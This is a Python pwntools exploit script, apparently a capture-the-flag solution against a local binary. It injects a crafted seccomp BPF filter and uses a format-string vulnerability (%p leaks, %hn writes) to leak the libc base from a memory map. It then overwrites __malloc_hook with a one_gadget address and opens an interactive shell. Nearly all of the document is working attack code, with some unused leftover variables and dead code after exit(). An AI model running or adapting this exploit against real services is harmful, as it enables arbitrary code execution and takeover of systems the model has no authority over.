#afangfang
from pwn import *

context.log_level = 'debug'
def bpf(op, jt, jf, k):
    return p16(op) + p8(jt) + p8(jf) + p32(k)

if __name__ == '__main__':

    #r = remote('124.16.75.162', 40004)
    env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc")}
    r = process("./binary", env=env)
    ld_1 = bpf(0x20, 0, 0, 0)
    jeq_1 = bpf(0x15, 4, 0, 3)
    jeq_2 = bpf(0x15, 0, 4, 2)
    ld_2 = bpf(0x20, 0, 0, 0x10)
    and_1 = bpf(0x54, 0, 0, 0xff)
    jeq_3 = bpf(0x15, 0, 1, 0x9c)
    ret_errno = bpf(6, 0, 0, 0x00050000)
    ret_allow = bpf(6, 0, 0, 0x7fff0000)

    bpf_payload = ld_1 + jeq_1 + jeq_2 + ld_2 + and_1 + jeq_3 + ret_errno + ret_allow

    ARCH_VALID = p64(0x0000000400000020)
    CHECK_ARCH = p64(0xc000003e00010015)
    RET_KILL = p64(0x0000000000000006)
    RET_ERRNO_EACCESS = p64(0x0005000d00000006) #return EACCESS
    RET_ERRNO_ENOENT = p64(0x0005000200000006) #return ENOENT
    RET_ALLOW = p64(0x7fff000000000006)
    LD_SYSCALL = p64(0x0000000000000020)
    CHECK_OPEN = p64(0x0000000205000015) 
    LD_ARG0 = p64(0x0000001000000020)
    CHECK_STRING= p64(0x00000e6401000015) 
    BPF_AND = p64(0x00000FFF00000054)

    rules = LD_SYSCALL+\
        CHECK_OPEN+\
        LD_ARG0+\
        BPF_AND+\
        CHECK_STRING+\
        RET_ALLOW+\
        RET_ERRNO_EACCESS+\
        RET_ALLOW+\
        RET_ALLOW

    bpf = "20000000000000001500000402000000200000001000000054000000ff000000150001005c0000000600000002000500060000000000ff7f".decode("hex")
    open("bpf","wb").write(bpf_payload)

    #gdb.attach(r)
    info("inject custom seccomp")
    r.send('A' * 40 + bpf_payload)

    info("trigger %n check")
    r.sendlineafter(':P\n', '%20c%20c%p%p%p%p%p%n')

    raw_input()
    r.sendlineafter(':P\n', '000000000000-7fffffffffff r-xp 00000000 00:00 0                          /usr/bin/whatever')
    
    imfine = '000000000000-7fffffffffff r-xp 00000000 00:00 0                          /usr/bin/whatever'

    r.sendline("M")
    print r.recv()
    data = r.recv()
    libc = data.split("heap]",)[1].split(" ")[0].split("-")[0]
    libc = int(libc,16)
    one_gadget = libc + 0xf0567
    malloc_hook= libc + 0x3c3b10
    print hex(libc)
    base = "%p" * 12
    #writer = "%{}c%hn".format(102+int(str(hex(one_gadget))[-4:],16) - 257)
    #concat = writer.ljust(0x10, "a")
    #payload= base + concat + p64(malloc_hook)

    part_one = int(str(hex(one_gadget))[-4:],16) -209
    already = part_one + 209
    part_two = int(str(hex(one_gadget))[-8:-4],16) - already
    if part_two < 0:
        part_two = 0x10000 + part_two
    already += part_two
    part_three = int(str(hex(one_gadget))[-12:-8],16) - already
    if part_three < 0:
        part_three = 0x10000 + part_three
    

    writer = "%p%p%p%{}c%hn%{}c%hn%{}c%hn".format(part_one,part_two, part_three).ljust(40,"a")
    target = p64(malloc_hook)
    target2 = p64(malloc_hook+2)
    target3 = p64(malloc_hook+2)
    target4 = p64(malloc_hook+4)
    target5 = p64(malloc_hook+4)
    payload = base + writer + target + target2 + target3 + target4 + target5

    raw_input("before second write")
    r.sendline("wrong")
    print r.recv()
    r.sendline(payload)
    print r.recv()
    r.sendline(imfine)
    raw_input("ready attack:")
    r.sendline("%n"*4 + p64(malloc_hook+0x30)*20)
    print r.recv()
    r.interactive()
    exit()
    raw_input()
    libc_file = open("./libc.so.6","rb").read()
    i = 0
    c = 0
    print len(libc_file)
    while i < len(libc_file):

        r.send(libc_file[i:i+4096])
        i += 4096
        c += 1
        print "number " + str(c)
        if len(libc_file) - i <= 4096:
            r.sendline(libc_file[i:i+(len(libc_file)-i)])
            break
    r.interactive()
